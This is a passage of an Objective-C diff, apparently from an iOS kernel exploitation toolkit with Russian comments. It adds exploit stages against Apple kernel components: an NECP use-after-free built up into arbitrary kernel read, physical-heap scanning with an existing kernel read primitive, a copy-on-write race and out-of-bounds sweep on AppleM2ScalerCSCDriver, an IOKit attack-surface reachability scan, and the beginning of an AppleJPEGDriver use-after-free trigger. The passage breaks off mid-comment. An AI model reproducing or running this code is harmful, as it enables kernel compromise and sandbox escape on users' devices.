+        long r0 = kpNecpAction(fd, KP_NECP_COPY_RESULT, (void *)uuid, 16, res, KP_NECP_COPY_SZ);
+        kpNote(r, [NSString stringWithFormat:@"  stage0 baseline (add_flow, БЕЗ remove): flow=%d copy_result → %ld%@",
+                  got, r0, r0 > 0 ? @"  ⚠ ВНИМАНИЕ: copy_result работает и без remove — «UAF» может быть легальным кэшем!" : @" (ок: без remove не читается)"]);
+        free(res);
+        if (r0 > 0) {
+            for (int o = 0; o < 0x20; o += 8) {
+                uint64_t q = 0;
+                memcpy(&q, res + o, 8);
+                kpNote(r, [NSString stringWithFormat:@"    baseline+0x%02x: %#018llx", o, (unsigned long long)q]);
+            }
+        }
+        if (got) kpNecpRemoveFlow(fd, flowUUID);
+    }
+
+    // Stage D: интроспекция ClearSword — РЕАЛЬНЫЙ layout flow. Гипотеза:
+    //     copy_result читает result-буфер по указателю В flow (не assigned_addr
+    //     напрямую — потому stage2 мимо). Снимаем оффсет этого указателя:
+    //     живой flow → copy_result (наполняет буфер) → читаем flow → чей
+    //     указатель указывает на буфер с контентом результата.
+    if (gPrimitives.kreadbuf) {
+        kpNote(r, @"  --- D: интроспекция necp flow через ClearSword ---");
+        uint8_t liveFlow[16];
+        if (kpNecpAddFlowRaw(fd, uuid, liveFlow) == 0) {
+            extern uint64_t kp_rc_kread64(uint64_t);
+            uint8_t *resD = calloc(1, KP_NECP_COPY_SZ);
+            long rd0 = kpNecpAction(fd, KP_NECP_COPY_RESULT, (void *)uuid, 16, resD, KP_NECP_COPY_SZ);
+            uint64_t selfProc = proc_self();
+            if (!kpLooksLikeKernelPointer(selfProc)) selfProc = [self findSelfProcByPidFast:(uint32_t)getpid() log:r];
+            if (!selfProc) selfProc = [self findSelfProcByComm:r];
+            if (!selfProc) selfProc = [self findProcByPid:(uint32_t)getpid() log:r];
+            uint64_t fdPtr = 0;
+            uint64_t fdTable = 0;
+            // RE: p_fd — НЕ указатель, а ВСТРОЕННЫЙ filedesc в proc (proc+0xD0).
+            // Цепь: fd_ofiles = *(u64*)(proc+0xF8) (PAC-подпись снимается
+            // kp_untag_ptr), массив [fd*8] = fileproc (сырой).
+            uint32_t fdNfiles = 0;
+            kpRead(selfProc + 0xE4, &fdNfiles, 4, "fd_nfiles", r);
+            kpRead(selfProc + 0xF8, &fdPtr, 8, "fd_ofiles", r);
+            fdTable = kp_untag_ptr(fdPtr);
+            kpNote(r, [NSString stringWithFormat:@"  D: fd_nfiles=%u fd_ofiles=%#llx (untag)", fdNfiles, fdTable]);
+            int fdOffOk = kpLooksLikeKernelPointer(fdTable) ? 1 : -1;
+            if (fdOffOk < 0) { kpNote(r, @"  D: fd_ofiles не указатель — стоп"); kpNecpRemoveFlow(fd, liveFlow); free(resD); } else {
+            uint64_t fpRaw = 0;
+            kpRead(fdTable + (uint64_t)fd * 8, &fpRaw, 8, "ofiles[fd]", r);   // fd_ofiles — уже сам массив
+            uint64_t fileprocVA = kp_untag_ptr(fpRaw);
+            uint64_t globRaw = 0, dataRaw = 0;
+            kpRead(fileprocVA + 0x10, &globRaw, 8, "fileproc.glob", r);
+            uint64_t globVA = kp_untag_ptr(globRaw);
+            kpRead(globVA + 0x38, &dataRaw, 8, "fileglob.data", r);
+            uint64_t clientVA = kp_untag_ptr(dataRaw);
+            kpNote(r, [NSString stringWithFormat:@"  D: fd=%d copy_result→%ld client=%#llx", fd, rd0, clientVA]);
+            if (kpLooksLikeKernelPointer(clientVA)) {
+                // дамп указателей клиента (понять layout клиента)
+                int cshown = 0;
+                for (uint64_t o = 0; o < 0x400 && cshown < 24; o += 8) {
+                    uint64_t v = kp_rc_kread64(clientVA + o);
+                    uint64_t u = kp_untag_ptr(v);
+                    if (kpLooksLikeKernelPointer(u)) {
+                        kpNote(r, [NSString stringWithFormat:@"    client+%#03llx → %#llx", (unsigned long long)o, u]);
+                        cshown++;
+                    }
+                }
+                // flow по heap-скану на uuid (та же техника, что нашла bufB)
+                uint64_t tableVA = [self frameTableVAWithLog:r];
+                uint64_t pb = kconstant(physBase), ps = kconstant(physSize);
+                uint32_t totalPages = (uint32_t)(ps >> 14);
+                uint32_t *heapPages = malloc((size_t)totalPages * 4);
+                if (!heapPages) { kpNote(r, @"  D: malloc fail"); } else {
+                    uint32_t nheap = 0;
+                    uint8_t fch[0x1000];
+                    for (uint32_t base2 = 0; base2 < totalPages; base2 += 256) {
+                        uint32_t n = totalPages - base2; if (n > 256) n = 256;
+                        kreadbuf(tableVA + (uint64_t)base2 * 16, fch, (size_t)n * 16);
+                        for (uint32_t j = 0; j < n; j++)
+                            if (fch[j * 16 + 2] == 0x21) heapPages[nheap++] = base2 + j;
+                    }
+                    kpNote(r, [NSString stringWithFormat:@"  D: heap-страниц (0x21): %u — скан на uuid flow…", nheap]);
+                    int candN = 0;
+                    for (uint32_t i = 0; i < nheap && candN < 4; i++) {
+                        uint64_t pa = pb + ((uint64_t)heapPages[i] << 14);
+                        uint64_t pva = gPrimitives.phystokv(pa);
+                        uint8_t pgch[0x1000];
+                        for (int seg = 0; seg < 4; seg++) {
+                            kreadbuf(pva + (uint64_t)seg * 0x1000, pgch, 0x1000);
+                            for (int q = 0; q <= 0x1000 - 16; q += 8) {
+                                if (!memcmp(pgch + q, liveFlow, 16)) {
+                                    candN++;
+                                    uint64_t matchVA = pva + (uint64_t)seg * 0x1000 + (uint64_t)q;
+                                    kpNote(r, [NSString stringWithFormat:@"★ flow-кандидат #%d: PA=%#llx uuid@+%#x VA=%#llx",
+                                                  candN, pa, seg * 0x1000 + q, matchVA]);
+                                    // дамп окна вокруг матча: указатели + матч resD
+                                    uint64_t wbase = matchVA - 0x100;
+                                    int shown = 0;
+                                    for (uint64_t o = 0; o < 0x700 && shown < 40; o += 8) {
+                                        uint64_t v = kp_rc_kread64(wbase + o);
+                                        uint64_t u = kp_untag_ptr(v);
+                                        if (!kpLooksLikeKernelPointer(u)) continue;
+                                        uint8_t tgt[16];
+                                        kreadbuf(u, tgt, 16);
+                                        BOOL matchRes = (rd0 > 0 && !memcmp(tgt, resD, rd0 < 16 ? (size_t)rd0 : 16));
+                                        kpNote(r, [NSString stringWithFormat:@"    win%+0x%03llx → %#llx%@",
+                                                      (long long)o - 0x100, u,
+                                                      matchRes ? @"  ◄◄◄ RESULT BUF!" : @""]);
+                                        shown++;
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    kpNote(r, [NSString stringWithFormat:@"  D: кандидатов на uuid: %d", candN]);
+                    free(heapPages);
+                }
+            }
+            kpNecpRemoveFlow(fd, liveFlow);
+            free(resD);
+            }
+        }
+    }
+
+    // Stage 1: does copy_result return anything after remove? (dangling flow)
+    {
+        uint8_t fake[KP_NCF_BUF_SZ];
+        memset(fake, 0, sizeof(fake));
+        uint8_t *res = calloc(1, KP_NECP_COPY_SZ);
+        long r3 = kpNecpUafExecute(fd, uuid, fake, sizeof(fake), res, KP_NECP_COPY_SZ, r);
+        kpNote(r, [NSString stringWithFormat:@"  stage1 (zero fake): copy_result → %ld%@", r3,
+                  r3 > 0 ? @"  ← DANGLING FLOW ЖИВ — UAF подтверждён!" : @""]);
+        if (r3 > 0) {
+            int nz = 0;
+            for (long i = 0; i < r3 && i < 256; i++) if (res[i]) nz++;
+            kpNote(r, [NSString stringWithFormat:@"  первые 256 байт: ненулевых %d (нулевой fake = системные данные подменены спреем?)", nz]);
+            long dumpLen = r3 < 256 ? r3 : 256;
+            for (long o = 0; o < dumpLen; o += 8) {
+                uint64_t q = 0;
+                memcpy(&q, res + o, 8);
+                if (q) kpNote(r, [NSString stringWithFormat:@"    leak+0x%02lx: %#018llx", o, (unsigned long long)q]);
+            }
+        }
+        free(res);
+        if (r3 <= 0) {
+            close(fd);
+            [r appendString:@"\n=== NECP: dangling flow не получен — на 18.6 баг, похоже, закрыт (или гейт-байт/оффсеты другие; syslog покажет VIOLATION если NECP заметил) ===\n"];
+            return r;
+        }
+    }
+
+    // Stage 2: arbitrary kread — fake flow with assigned_addr = kernel base.
+    {
+        uint64_t kbase = kconstant(base);
+        uint8_t fake[KP_NCF_BUF_SZ];
+        memset(fake, 0, sizeof(fake));
+        *(uint64_t *)(fake + 0x00) = 0;
+        *(uint64_t *)(fake + 0x88) = 0;
+        *(uint64_t *)(fake + KP_NCF_ASSIGNED_OFF) = kbase;
+        *(uint64_t *)(fake + KP_NCF_ASSIGNED_LEN_OFF) = 0x40;
+        uint8_t *res = calloc(1, KP_NECP_COPY_SZ);
+        errno = 0;
+        long r3 = kpNecpUafExecute(fd, uuid, fake, sizeof(fake), res, KP_NECP_COPY_SZ, r);
+        kpNote(r, [NSString stringWithFormat:@"  stage2 (assigned=kernel base %#llx): copy_result → %ld (errno=%d %@)",
+                     (unsigned long long)kbase, r3, errno, r3 < 0 ? [NSString stringWithFormat:@"(%s)", strerror(errno)] : @""]);
+        if (r3 > 0) {
+            uint32_t magic = 0;
+            memcpy(&magic, res, 4);
+            kpNote(r, [NSString stringWithFormat:@"  qword0: %#018llx · magic32: 0x%08x (ждём 0xfeedfacf)",
+                      (unsigned long long)*(uint64_t *)res, magic]);
+            if (magic == 0xfeedfacf) {
+                kpNote(r, @"=== NECP KREAD VERIFIED: произвольное чтение ядра через NECP UAF — второй, независимый от ClearSword примитив! ===");
+            } else {
+                kpNote(r, @"  magic не совпал — assigned_addr оффсет другой на 18.6 или fake flow layout изменился (данные есть — UAF жив, донастроить layout)");
+            }
+        }
+        free(res);
+    }
+    close(fd);
+    return r;
+}
+
+#pragma mark - M2Scaler CVE-2025-43510 COW race + OOB sweep (PoC v3 port)
+
+typedef struct {
+    uint64_t ptr, size;
+    uint32_t stride, pad;
+} KPM2PlaneInfo;
+
+typedef struct {
+    uint32_t plane_count, format, width, height;
+    KPM2PlaneInfo planes[64];
+} KPM2MultiPlaneDesc;
+
+typedef struct {
+    uint32_t plane_count, format, width, height;
+    KPM2PlaneInfo planes[4];
+    uint32_t out_plane_count, out_format, out_width, out_height;
+    KPM2PlaneInfo out_planes[4];
+} KPM2ScalerOpDesc;
+
+#define KP_M2_PAGE 0x4000
+#define KP_M2_RACE_BUF (4 * KP_M2_PAGE)
+#define KP_M2_RACE_THREADS 12
+#define KP_M2_RACE_ITERS 50000
+
+static _Atomic bool gM2CowStop = false;
+static void *gM2CowSrc = MAP_FAILED;
+
+static void *kpM2CowFlipper(void *arg)
+{
+    volatile uint8_t *p = (volatile uint8_t *)gM2CowSrc;
+    while (!atomic_load_explicit(&gM2CowStop, memory_order_relaxed)) {
+        *p = 0x41; __asm__ volatile("dmb ish" ::: "memory");
+        *p = 0x42; __asm__ volatile("dmb ish" ::: "memory");
+    }
+    return NULL;
+}
+
+static const char *kpM2Meaning(kern_return_t kr)
+{
+    switch (kr) {
+        case 0: return "  ← SUCCESS с пустым вводом!";
+        case 0xe00002be: return " (NotPermitted)";
+        case 0xe00002c2: return " (BadArgument)";
+        case 0xe00002c7: return " (Unsupported)";
+        case 0xe00002c5: return " (Busy)";
+        case 0xe00002bc: return " (Error)";
+        case 0xe00002cd: return " (Invalid)";
+        case 0xe00002ca: return " (NoMemory)";
+        case 0xe0000001: return " (KERN_INVALID_ARGUMENT)";
+    }
+    return "";
+}
+
++ (NSString *)m2CowRaceReport
+{
+    NSMutableString *r = [NSMutableString string];
+    kpNote(r, @"=== AppleM2ScalerCSCDriver: probe + OOB sweep + COW race (CVE-2025-43510 / CVE-2026-43655, PoC v3) ===");
+    kpNote(r, @"!!! COW race МОЖЕТ РЕБУТНУТЬ — ребут в гонке и есть подтверждение COW-уязвимости !!!");
+
+    io_connect_t conn = IO_OBJECT_NULL;
+    int usedType = -1;
+    // type 1 FIRST: type-0 connections on 18.6 reject raw-VA descriptors with
+    // BadArgument (validated IOSurface-ID-only ABI). The COW-vulnerable path
+    // from the PoC needs the type-1 external method surface.
+    for (int ut = 1; ut >= 0 && conn == IO_OBJECT_NULL; ut--) {
+        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                                                       IOServiceMatching("AppleM2ScalerCSCDriver"));
+        if (!svc) { [r appendString:@"\n=== M2 SKIP: сервис не найден ===\n"]; return r; }
+        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), ut, &conn);
+        IOObjectRelease(svc);
+        if (kr != KERN_SUCCESS) conn = IO_OBJECT_NULL;
+        else { usedType = ut; kpNote(r, [NSString stringWithFormat:@"  открыт userType=%d conn=0x%x", ut, conn]); }
+    }
+    if (conn == IO_OBJECT_NULL) { [r appendString:@"\n=== M2 SKIP: IOServiceOpen не прошёл ===\n"]; return r; }
+    (void)usedType;
+
+    // Phase 1: probe all selectors 0-15 with zero input
+    kpNote(r, @"  --- probe методов (sel 0-15, 512B нулей) ---");
+    uint8_t inBuf[512] = {0};
+    for (int sel = 0; sel <= 15; sel++) {
+        uint64_t outS[32] = {0}; size_t outC = 32;
+        kern_return_t kr = IOConnectCallMethod(conn, sel, NULL, 0, inBuf, sizeof(inBuf),
+                                               outS, &outC, NULL, NULL);
+        kpNote(r, [NSString stringWithFormat:@"    sel %2d: kr=0x%08x%s outCnt=%zu", sel, kr, kpM2Meaning(kr), outC]);
+        for (size_t i = 0; i < outC && i < 8; i++)
+            if (outS[i]) kpNote(r, [NSString stringWithFormat:@"      outS[%zu]=%#018llx", i, (unsigned long long)outS[i]]);
+    }
+
+    // Phase 2: OOB read boundary sweep (MultiPlaneDescriptor, sel 5-7)
+    kpNote(r, @"  --- OOB sweep (plane_count 1-8, sel 5-7) ---");
+    void *buf = mmap(NULL, KP_M2_PAGE * 64, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (buf == MAP_FAILED) { IOServiceClose(conn); [r appendString:@"FAIL: mmap\n"]; return r; }
+    memset(buf, 0xab, KP_M2_PAGE * 64);
+    for (int sel = 5; sel <= 7; sel++) {
+        for (int pc = 1; pc <= 8; pc++) {
+            KPM2MultiPlaneDesc desc = {};
+            desc.plane_count = pc;
+            desc.format = 0x7f;
+            desc.width = 64; desc.height = 64;
+            for (int i = 0; i < pc && i < 64; i++) {
+                desc.planes[i].ptr = (uint64_t)((uint8_t *)buf + i * KP_M2_PAGE);
+                desc.planes[i].size = KP_M2_PAGE;
+                desc.planes[i].stride = 64;
+            }
+            uint64_t outS[32] = {0}; size_t outC = 32;
+            kern_return_t kr = IOConnectCallMethod(conn, sel, NULL, 0, &desc, sizeof(desc),
+                                                   outS, &outC, NULL, NULL);
+            NSMutableString *line = [NSMutableString stringWithFormat:@"    sel=%d pc=%d kr=0x%x outCnt=%zu", sel, pc, kr, outC];
+            for (size_t i = 0; i < outC; i++) {
+                if (outS[i] > 0xfffffff000000000ULL) {
+                    [line appendFormat:@"  [!!] KPTR[%zu]=%#018llx ← KASLR LEAK", i, (unsigned long long)outS[i]];
+                } else if (outS[i]) {
+                    [line appendFormat:@"  outS[%zu]=%#018llx", i, (unsigned long long)outS[i]];
+                }
+            }
+            kpNote(r, line);
+        }
+    }
+    munmap(buf, KP_M2_PAGE * 64);
+
+    // Phase 3: COW race
+    kpNote(r, @"  --- COW race (probe sel 0-7, потом 50k итераций × 12 флипперов) ---");
+    void *testBuf = mmap(NULL, KP_M2_RACE_BUF, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    void *outBuf = mmap(NULL, KP_M2_RACE_BUF, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (testBuf == MAP_FAILED || outBuf == MAP_FAILED) { IOServiceClose(conn); [r appendString:@"FAIL: mmap2\n"]; return r; }
+    memset(testBuf, 0x41, KP_M2_RACE_BUF);
+    for (int sel = 0; sel <= 7; sel++) {
+        KPM2ScalerOpDesc desc = {};
+        desc.plane_count = 1; desc.format = 0x7f;
+        desc.width = 64; desc.height = 64;
+        desc.planes[0].ptr = (uint64_t)(uintptr_t)testBuf;
+        desc.planes[0].size = KP_M2_RACE_BUF; desc.planes[0].stride = 64;
+        desc.out_plane_count = 1; desc.out_format = 0x7f;
+        desc.out_width = 64; desc.out_height = 64;
+        desc.out_planes[0].ptr = (uint64_t)(uintptr_t)outBuf;
+        desc.out_planes[0].size = KP_M2_RACE_BUF; desc.out_planes[0].stride = 64;
+        uint64_t outS[32] = {0}; size_t outC = 32;
+        kern_return_t kr = IOConnectCallMethod(conn, sel, NULL, 0, &desc, sizeof(desc),
+                                               outS, &outC, NULL, NULL);
+        kpNote(r, [NSString stringWithFormat:@"    probe sel %d kr=0x%08x%@", sel, kr,
+                  kr == 0 ? @"  ← ПРИНИМАЕТ ВВОД!" : (kr == 0xe00002c2 ? @" (BadArgument)" : (kr == 0xe00002c7 ? @" (Unsupported)" : @" (Error)"))]);
+    }
+    vm_address_t cow = 0; vm_prot_t c, m;
+    kern_return_t rkr = vm_remap(mach_task_self(), &cow, KP_M2_RACE_BUF, 0,
+                                 VM_FLAGS_ANYWHERE, mach_task_self(),
+                                 (vm_address_t)testBuf, TRUE, &c, &m, VM_INHERIT_DEFAULT);
+    if (rkr != KERN_SUCCESS) {
+        kpNote(r, [NSString stringWithFormat:@"  vm_remap: 0x%x — COW race невозможен", rkr]);
+        IOServiceClose(conn);
+        return r;
+    }
+    kpNote(r, [NSString stringWithFormat:@"  COW remap OK: src=%p cow=0x%lx — гонка стартует (ребут возможен в любой момент)", testBuf, (unsigned long)cow]);
+    gM2CowSrc = testBuf;
+    atomic_store(&gM2CowStop, false);
+    pthread_t th[KP_M2_RACE_THREADS];
+    for (int i = 0; i < KP_M2_RACE_THREADS; i++) pthread_create(&th[i], NULL, kpM2CowFlipper, NULL);
+    for (int i = 0; i < KP_M2_RACE_ITERS; i++) {
+        int sel = (i % 8);
+        KPM2ScalerOpDesc desc = {};
+        desc.plane_count = 1; desc.format = 0x7f;
+        desc.width = 64; desc.height = 64;
+        desc.planes[0].ptr = cow;
+        desc.planes[0].size = KP_M2_RACE_BUF; desc.planes[0].stride = 64;
+        desc.out_plane_count = 1; desc.out_format = 0x7f;
+        desc.out_width = 64; desc.out_height = 64;
+        desc.out_planes[0].ptr = (uint64_t)(uintptr_t)outBuf;
+        desc.out_planes[0].size = KP_M2_RACE_BUF; desc.out_planes[0].stride = 64;
+        kern_return_t rr = IOConnectCallMethod(conn, sel, NULL, 0, &desc, sizeof(desc),
+                                               NULL, NULL, NULL, NULL);
+        if (i < 16 || (rr == 0 && i < 200))
+            kpNote(r, [NSString stringWithFormat:@"    [%d] sel=%d kr=0x%x", i, sel, rr]);
+        if (i % 5000 == 0) kpNote(r, [NSString stringWithFormat:@"    %d/%d — живы", i, KP_M2_RACE_ITERS]);
+    }
+    atomic_store(&gM2CowStop, true);
+    for (int i = 0; i < KP_M2_RACE_THREADS; i++) pthread_join(th[i], NULL);
+    vm_deallocate(mach_task_self(), cow, KP_M2_RACE_BUF);
+    munmap(testBuf, KP_M2_RACE_BUF);
+    munmap(outBuf, KP_M2_RACE_BUF);
+    IOServiceClose(conn);
+    kpNote(r, @"--- COW race завершён без паники: драйвер на 18.6 не использует COW-уязвимый путь копирования по sel 0-7 (или гонка не сложилась — повторить) ---");
+    [r appendString:@"\n=== M2 COW race: дожили до конца. Все kr и probe-результаты выше — по ним решаем, есть ли OOB read (KPTR leak) и жив ли COW path ===\n"];
+    return r;
+}
+
+#pragma mark - AppleJPEGDriver UAF (CVE-2026-20687)
+
+// startDecoder Timeout/terminate UAF: async decode → queue_io_gated pushes
+// req+0x78 into per-codec vector; close sets isInactive → taggedRelease
+// skipped → freed JpegRequest stays queued; fullSpeedRequestExist walks the
+// stale vector → MTE tag fault. JpegRequest 0x440; asyncToken (input+0x30)
+// lands at req+16 — visible to our marker hunt live. Unpatched on 18.6
+// (fixed 18.7.7). May panic — the panic IS the confirmation.
+typedef struct __attribute__((packed)) {
+    uint32_t sourceID;
+    uint32_t field_04;
+    uint32_t destID;
+    uint32_t field_0C;
+    uint32_t field_10;
+    uint32_t width;
+    uint32_t height;
+    uint32_t field_1C;
+    uint8_t  flags;
+    uint8_t  pad_21[3];
+    uint32_t xOffset;
+    uint32_t yOffset;
+    uint32_t subsampling;
+    uint64_t asyncToken;
+    uint64_t asyncToken2;
+    uint64_t field_40;
+    uint32_t codecID;
+    uint32_t outWidth;
+    uint32_t outHeight;
+    uint32_t field_54;
+} KPJIosStruct;
+_Static_assert(sizeof(KPJIosStruct) == 0x58, "KPJIosStruct must be 88 bytes");
+
+static NSData *kpJTestJPEG(int w, int h)
+{
+    UIGraphicsBeginImageContext(CGSizeMake(w, h));
+    [[UIColor redColor] setFill];
+    UIRectFill(CGRectMake(0, 0, w, h));
+    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
+    UIGraphicsEndImageContext();
+    // Progressive JPEG: multi-pass decode keeps HW busy far longer.
+    NSMutableData *out = [NSMutableData data];
+    CGImageDestinationRef dest = CGImageDestinationCreateWithData((__bridge CFMutableDataRef)out,
+                                                                  (__bridge CFStringRef)@"public.jpeg", 1, NULL);
+    if (dest) {
+        CGImageDestinationAddImage(dest, img.CGImage, (__bridge CFDictionaryRef)@{
+            (id)kCGImagePropertyJFIFIsProgressive: @YES,
+            (id)kCGImageDestinationLossyCompressionQuality: @0.9,
+        });
+        CGImageDestinationFinalize(dest);
+        CFRelease(dest);
+    }
+    if (!out.length) return UIImageJPEGRepresentation(img, 0.9);
+    return out;
+}
+
+static IOSurfaceRef kpJCreateSrc(NSData *jpegData)
+{
+    size_t len = jpegData.length;
+    size_t allocLen = (len + 0x3FFF) & ~0x3FFFUL;
+    NSDictionary *props = @{
+        (id)kIOSurfaceWidth: @(allocLen),
+        (id)kIOSurfaceHeight: @1,
+        (id)kIOSurfaceBytesPerElement: @1,
+        (id)kIOSurfacePixelFormat: @0x20202020,
+    };
+    IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)props);
+    if (!surf) return NULL;
+    IOSurfaceLock(surf, 0, NULL);
+    memcpy(IOSurfaceGetBaseAddress(surf), jpegData.bytes, jpegData.length);
+    IOSurfaceUnlock(surf, 0, NULL);
+    return surf;
+}
+
+static IOSurfaceRef kpJCreateDst(uint32_t w, uint32_t h)
+{
+    NSDictionary *props = @{
+        (id)kIOSurfaceWidth: @(w),
+        (id)kIOSurfaceHeight: @(h),
+        (id)kIOSurfaceBytesPerElement: @4,
+        (id)kIOSurfacePixelFormat: @0x42475241,
+    };
+    return IOSurfaceCreate((__bridge CFDictionaryRef)props);
+}
+
+static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
+                          uint32_t W, uint32_t H, int N, uint64_t tokenBase, NSMutableString *r)
+{
+    int submitted = 0;
+    for (int j = 0; j < N; j++) {
+        KPJIosStruct input = {0}, output = {0};
+        input.sourceID    = srcID;
+        input.field_04    = W * H;
+        input.destID      = dstID;
+        input.field_0C    = W * H * 4;
+        input.width       = W;
+        input.height      = H;
+        input.outWidth    = W;
+        input.outHeight   = H;
+        input.subsampling = 3;
+        input.asyncToken  = tokenBase + j;
+        size_t outSize = sizeof(output);
+        kern_return_t kr = IOConnectCallStructMethod(conn, 1, &input, sizeof(input), &output, &outSize);
+        if (kr != KERN_SUCCESS) {
+            if (j == 0) kpNote(r, [NSString stringWithFormat:@"    submit[0]: kr=0x%x (%s)", kr, mach_error_string(kr)]);
+            break;
+        }
+        submitted++;
+    }
+    return submitted;
+}
+
+// Reachability-матрица: по одному IOServiceOpen на сервис-кандидат из охоты
+// (agent-45). Отвечает: что реально открывается из нашей песочницы → что
+// аудировать/атаковать глубоко. Только открытие/закрытие — безопасно.
++ (NSString *)reachabilityReport
+{
+    NSMutableString *r = [NSMutableString string];
+    kpNote(r, @"=== Reachability matrix (по одному IOServiceOpen на сервис) ===");
+    kpNote(r, @"kr=0 → ОТКРЫВАЕТСЯ (нет kernel-side гейта) → аудировать глубоко; 0xe00002c5/0xe00002c2 → закрыт (entitlement/sandbox)");
+    const char *services[] = {
+        "IOAccessoryManager", "IOAccessoryEAInterface", "AppleSARService", "ApplePPMCPMS",
+        "AppleM2ScalerCSCDriver", "AppleAVE2", "AppleAVD", "AppleJPEGDriver",
+        "IOAudio2Device", "IOStream", "IOHIDEventService", "IOGPU",
+        "IOReportHub", "AppleSmartIO2", "AppleAUC", "IOCEC",
+        NULL,
+    };
+    for (int i = 0; services[i]; i++) {
+        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(services[i]));
+        if (!svc) {
+            kpNote(r, [NSString stringWithFormat:@"  %-28s сервис не найден (sandbox прячет / нет)", services[i]]);
+            continue;
+        }
+        io_connect_t conn = 0;
+        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+        if (kr == 0 && conn) {
+            kpNote(r, [NSString stringWithFormat:@"  %-28s ★ ОТКРЫЛСЯ (conn=%#x) — ПОВЕРХНОСТЬ ЖИВАЯ", services[i], conn]);
+            IOServiceClose(conn);
+        } else {
+            kpNote(r, [NSString stringWithFormat:@"  %-28s kr=0x%x (%s)", services[i], kr, mach_error_string(kr)]);
+        }
+        IOObjectRelease(svc);
+    }
+    kpNote(r, @"=== конец матрицы ===");
+    return r;
+}
+
++ (NSString *)jpegUafReport
+{
+    NSMutableString *r = [NSMutableString string];
+    kpNote(r, @"=== CVE-2026-20687: AppleJPEGDriver startDecoder UAF (victim→reclaim→trigger) ===");
+    kpNote(r, @"!!! МОЖЕТ ПАНИКОВАТЬ (MTE tag check fault в fullSpeedRequestExist) — паника = баг подтверждён !!!");
+
+    errno = 0;
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                                                   IOServiceMatching("AppleJPEGDriver"));
+    if (!svc) {
+        kpNote(r, [NSString stringWithFormat:@"  AppleJPEGDriver: не найден (errno=%d) — sandbox прячет", errno]);
+        [r appendString:@"\n=== JPEG UAF SKIP: сервис недоступен ===\n"];
+        return r;
+    }
+    kpNote(r, [NSString stringWithFormat:@"  AppleJPEGDriver: 0x%x", svc]);
+
+    // baseline probes
+    {
+        io_connect_t pc = 0;
+        if (IOServiceOpen(svc, mach_task_self(), 0, &pc) == KERN_SUCCESS && pc) {
+            kern_return_t kr = IOConnectCallMethod(pc, 2, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
+            kpNote(r, [NSString stringWithFormat:@"  health (sel 2 query): kr=0x%x — драйвер %@", kr, kr == 0 ? @"OK" : @"BROKEN/занят"]);
+            IOServiceClose(pc);
+        }
+    }
+
+    const uint32_t W = 2048, H = 2048;
+    NSData *jpegData = kpJTestJPEG(W, H);
+    IOSurfaceRef srcS = kpJCreateSrc(jpegData);
+    IOSurfaceRef dstS = kpJCreateDst(W, H);
+    if (!srcS || !dstS) {
+        kpNote(r, @"  IOSurfaceCreate failed — выход");
+        if (srcS) CFRelease(srcS);
+        if (dstS) CFRelease(dstS);
+        IOObjectRelease(svc);
+        [r appendString:@"\n=== JPEG UAF SKIP: surfaces ===\n"];
+        return r;
+    }
+    uint32_t srcID = IOSurfaceGetID(srcS);
+    uint32_t dstID = IOSurfaceGetID(dstS);
+    kpNote(r, [NSString stringWithFormat:@"  surfaces: src=%u dst=%u jpeg=%lu bytes", srcID, dstID, (unsigned long)jpegData.length]);
+
+    // Truncated source for the sync trigger: valid header, no EOI — decoder
+    // starts and hangs to the 10s timeout (pool_free without dequeue).
+    NSData *badData = [jpegData subdataWithRange:NSMakeRange(0, (NSUInteger)(jpegData.length * 0.4))];
+    IOSurfaceRef srcBad = kpJCreateSrc(badData);
+    uint32_t srcBadID = srcBad ? IOSurfaceGetID(srcBad) : 0;
+    kpNote(r, [NSString stringWithFormat:@"  truncated src=%u (%lu байт, без EOI — таймаут-путь)", srcBadID, (unsigned long)badData.length]);
+
+    // KRW marker hunt for asyncToken (lands at req+16) — sees the request
+    // pool live: where JpegRequests sit, whether they recycle on reclaim.
+    void (^tokenHunt)(uint64_t, NSString *) = ^(uint64_t marker, NSString *tag) {
+        if (!gPrimitives.kreadbuf) return;
+        uint64_t tableVA2 = gFrameTableVA ? gFrameTableVA : [self frameTableVAWithLog:r];
+        if (!tableVA2) return;
+        uint64_t totalPages = kconstant(physSize) >> 14;
+        if (totalPages > 6000) totalPages = 6000; // trimmed: tempo over coverage
+        int hits = 0;
+        for (uint64_t pg = 0; pg < totalPages && hits < 8; pg++) {
+            uint8_t ent[16];
+            kreadbuf(tableVA2 + pg * 16, ent, 16);
+            if (ent[2] != 0x21) continue;
+            if ((pg % 1000) == 0 && pg) kpNote(r, [NSString stringWithFormat:@"    %@: скан %llu/%llu…", tag, (unsigned long long)pg, (unsigned long long)totalPages]);
+            uint64_t pa = kconstant(physBase) + pg * 0x4000;
+            uint64_t kva = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
+            if (!kva) continue;
+            uint8_t buf[0x4000];
+            if (!kpRead(kva, buf, sizeof(buf), "jpeg token scan", r)) continue;
+            for (uint32_t o = 0; o + 8 <= sizeof(buf); o += 8) {
+                uint64_t v = 0;
+                memcpy(&v, buf + o, 8);
+                if (v == marker) {
+                    kpNote(r, [NSString stringWithFormat:@"    %@: токен %#llx @ kva=%#llx (PA=%#llx, +%#x)",
+                              tag, (unsigned long long)marker, (unsigned long long)(kva + o), (unsigned long long)pa, o]);
+                    hits++;
+                    break;
+                }
+            }
+        }
+        kpNote(r, [NSString stringWithFormat:@"  %@: токен %#llx найден %d раз", tag, (unsigned long long)marker, hits]);
+    };
+
+    // Раунд-12 (дизассембл 18.6): close ХОДИТ по очередям и корректно удаляет
+    // запросы клиента (поэтому маркер-скан находил 0); sync-триггер (token==0)
+    // падает kIOReturnNotReady при занятом engine ДО постановки в очередь и
+    // по списку не ходит. Баг живёт в pool/timeout-колее: victim шлёт async с
